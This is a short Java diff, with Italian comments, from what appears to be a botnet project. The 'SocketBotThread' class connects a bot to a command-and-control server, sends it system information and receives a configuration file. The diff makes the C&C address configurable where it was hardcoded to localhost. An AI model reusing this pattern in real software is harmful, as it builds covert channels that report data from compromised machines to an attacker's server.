@@ -10,24 +10,34 @@ import control.ConfigHeader;
 import model.SystemInfoEntry;
 import model.URLEntry;
 
+/**
+ * Thread presente sul Bot che comunica con il Server C&C al quale invia
+ * le informazioni di sistema e dal quale riceve il file di configurazione
+ */
 public class SocketBotThread extends Thread{
-
-	Socket clientSocket;
 	
+	Socket clientSocket;
 	ConfigHeader inConfigHeader;
 	ArrayList<URLEntry> inContactList;
 	ArrayList<SystemInfoEntry> outSystemInfo;
+	String serverAddress;
 	
+	public SocketBotThread(String serverAddress) {
+		this.serverAddress = serverAddress;
+	}
 	
+	/**
+	 * Il metodo run() contatta il Server C&C al quale invia le informazioni di sistema 
+	 * e dal quale riceve il file di configurazione
+	 */
 	@SuppressWarnings("unchecked")
 	@Override
 	public void run() {
 		
 		synchronized (this) {
 			
-		
 			try {
-				clientSocket = new Socket("localhost", 6789);
+				clientSocket = new Socket(serverAddress, 6789);
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
